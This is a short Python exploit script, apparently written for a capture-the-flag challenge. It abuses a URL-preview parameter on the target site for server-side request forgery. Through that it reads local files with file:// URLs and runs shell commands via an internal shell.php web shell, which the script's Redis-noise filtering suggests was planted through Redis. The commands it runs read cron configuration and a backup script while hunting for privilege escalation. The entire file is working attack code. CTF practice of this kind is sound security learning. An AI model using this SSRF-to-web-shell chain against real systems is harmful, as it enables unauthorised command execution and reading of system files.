import urllib.request
import urllib.parse
import re
import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url, timeout=10):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req, timeout=timeout)
        html = res.read().decode('utf-8', errors='replace')
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return m.group(1).strip()[:3000]
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'OTHER'
    except Exception as e:
        return f'EXCEPTION: {e}'

def shell(cmd):
    result = fetch(f'http://127.0.0.1/shell.php?c={urllib.parse.quote(cmd)}')
    # Strip Redis binary noise
    lines = result.split('\n')
    clean = [l for l in lines if not any(x in l for x in ['REDIS0009', 'redis-ver', 'aof-preamble', '\x00'])]
    return '\n'.join(clean).strip()

# Read backup.sh
print("=== cat /opt/ops/backup.sh ===")
print(shell('cat /opt/ops/backup.sh'))
print()

# Read all cron.d entries
print("=== cat /etc/cron.d/* ===")
print(shell('cat /etc/cron.d/e2scrub_all'))
print()
print(shell('cat /etc/cron.d/php'))
print()

# Read crontab
print("=== cat /etc/crontab ===")
print(fetch('file:///etc/crontab'))
print()

# Check if backup.sh is referenced in cron
print("=== grep -r backup /etc/cron* ===")
print(shell('grep -r backup /etc/cron.d/ /etc/crontab 2>/dev/null'))
